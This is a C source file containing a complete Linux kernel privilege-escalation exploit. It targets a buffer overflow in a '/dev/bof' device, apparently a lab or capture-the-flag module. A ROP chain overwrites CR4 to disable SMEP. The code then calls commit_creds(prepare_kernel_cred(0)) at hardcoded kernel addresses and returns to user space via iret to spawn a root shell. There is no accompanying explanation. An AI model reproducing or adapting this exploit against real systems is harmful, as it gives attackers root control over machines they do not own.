#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

struct trap_frame{
    void *eip;
    uint32_t cs;
    uint32_t eflags;
    void *esp;
    uint32_t ss;
}__attribute__((packed));

struct trap_frame tf;

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void *) KERNCALL = (void *)0xC10711F0;
void* (*commit_creds)(void *) KERNCALL = (void *)0xC1070E80;

void get_shell() {
    execl("/bin/sh", "sh", NULL);
}

void init_tf_work() {
    asm(
        "pushl %cs;popl tf+4;"
        "pushfl;popl tf+8;"
        "pushl %esp;popl tf+12;"
        "pushl %ss;popl tf+16;"
    );
    tf.eip = &get_shell;
    tf.esp -= 1024;
}

void root() {
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf, %esp;"
        "iret;");
}

/*
0xc183c7f7 : pop eax ; ret
0xc1045053 : mov cr4, eax ; pop ebp ; ret
*/

int main(int argc, char const *argv[])
{
    char rop_chain[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf7\xc7\x83\xc1\xd0\x06\x00\x00SP\x04\xc1\xef\xbe\xad\xde\x83\x9d\x04\x08\xef\xbe\xad\xde";
    init_tf_work();

    int fd = open("/dev/bof", 2);
    write(fd, rop_chain, sizeof(rop_chain));
    return 0;
}